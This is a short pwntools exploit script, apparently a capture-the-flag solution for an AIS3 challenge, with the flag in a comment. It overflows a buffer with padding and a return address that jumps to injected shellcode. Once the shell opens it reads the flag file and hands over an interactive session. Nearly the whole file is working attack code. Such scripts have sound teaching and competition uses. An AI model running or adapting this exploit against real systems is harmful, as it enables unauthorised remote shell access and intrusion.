#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# AIS3{JumP_to_sh3llcod3_jUmp_t0_th3_w0rld}

context.arch = 'amd64'

host , port = 'pwnhub.tw' , 54321
#host , port = '192.168.78.141' , 4000
y = remote( host , port )


sh = asm( shellcraft.sh() )

p = 'D' * 0x28
p += p64( 0x601080 )

print len( sh )

y.sendafter( ':' , sh )
y.sendlineafter( ':' , p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()